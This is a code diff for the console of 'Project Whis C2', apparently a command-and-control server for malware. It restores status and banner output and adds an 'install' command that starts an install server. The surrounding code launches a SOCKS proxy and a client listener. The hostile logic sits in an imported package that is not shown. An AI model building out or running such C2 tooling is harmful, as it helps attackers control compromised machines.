@@ -1,21 +1,23 @@
 package main
 
 import (
-	"ProjectWhis/C2/core"
 	"bufio"
 	"database/sql"
 	"encoding/base64"
 	"fmt"
-	_ "github.com/go-sql-driver/mysql"
 	"log"
 	"os"
 	"os/signal"
+	"strconv"
 	"time"
+
+	"github.com/SaturnsVoid/Project-Whis/C2/core"
+	_ "github.com/go-sql-driver/mysql"
 )
 
 var (
-	//	ServerStatus     bool = false
-	//	FrontEndEndabled bool = true
+	ServerStatus     bool = false
+	FrontEndEndabled bool = true
 
 	Banner string = `
 
@@ -70,15 +72,15 @@ func main() {
 	core.Log.Println("Configuring Server")
 	go core.GoServerWithFrontend()
 	go core.Daemon()
-	//	ServerStatus = true
-	//	FrontEndEndabled = true
+	ServerStatus = true
+	FrontEndEndabled = true
 
 Menu:
 
-	//	fmt.Println(Banner)
+	fmt.Println(Banner)
 	fmt.Println("Project Whis C2 Console")
-	//	fmt.Println("Server Status: " + strconv.FormatBool(ServerStatus))
-	//	fmt.Println("Server Frontend: " + strconv.FormatBool(FrontEndEndabled))
+	fmt.Println("Server Status: " + strconv.FormatBool(ServerStatus))
+	fmt.Println("Server Frontend: " + strconv.FormatBool(FrontEndEndabled))
 	fmt.Println(" ")
 	fmt.Print("-> ")
 	CommandScan := bufio.NewScanner(os.Stdin)
@@ -168,6 +170,9 @@ Menu:
 
 		go core.ListenForSocks("8090")
 		log.Fatal(core.ListenForClients("127.0.0.1:6969"))
+	case "install":
+		fmt.Println("Enabling Install Server...")
+		go core.Install()
 	case "exit":
 		fmt.Println("Closing C2 Server.")
 		time.Sleep(5 * time.Second)
